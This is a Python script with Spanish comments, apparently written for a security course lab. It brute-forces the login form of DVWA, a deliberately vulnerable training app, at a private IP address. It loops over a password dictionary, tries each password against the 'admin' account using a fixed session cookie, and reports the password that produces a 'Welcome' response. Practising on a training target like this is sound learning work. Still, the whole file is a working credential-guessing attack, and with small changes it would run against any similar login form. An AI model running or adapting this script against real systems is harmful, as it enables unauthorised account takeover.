import requests

# --- CONFIGURACIÓN ---
target_ip = "192.168.1.145"
# PEGA AQUÍ TU PHPSESSID (Sin espacios extra)
session_id = "ahvn42qtc69gc2iam84bas9ic3" 

# CAMBIAR ESTO SEGÚN EL NIVEL QUE TOQUE ('low' o 'medium')
security_level = "low" 
# ---------------------

url = f"http://{target_ip}:9090/vulnerabilities/brute/"
cookies = {'PHPSESSID': session_id, 'security': security_level}

print(f"[*] Iniciando ataque en nivel: {security_level.upper()}...")

# Leemos el diccionario
try:
    with open("diccionario.txt", "r") as f:
        passwords = f.read().splitlines()
except FileNotFoundError:
    print("Error: No encuentro el archivo diccionario.txt")
    exit()

for password in passwords:
    # Parámetros que pide DVWA (verificados en el PDF)
    params = {'username': 'admin', 'password': password, 'Login': 'Login'}
    
    try:
        # Enviamos la petición
        r = requests.get(url, params=params, cookies=cookies)
        
        # El PDF indica que si el login es correcto, aparece "Welcome"
        if "Welcome" in r.text:
            print(f"\n[!!!] ÉXITO: Contraseña encontrada -> {password}")
            break
        else:
            print(f"[-] Fallo con: {password}")
            
    except Exception as e:
        print(f"Error de conexión: {e}")
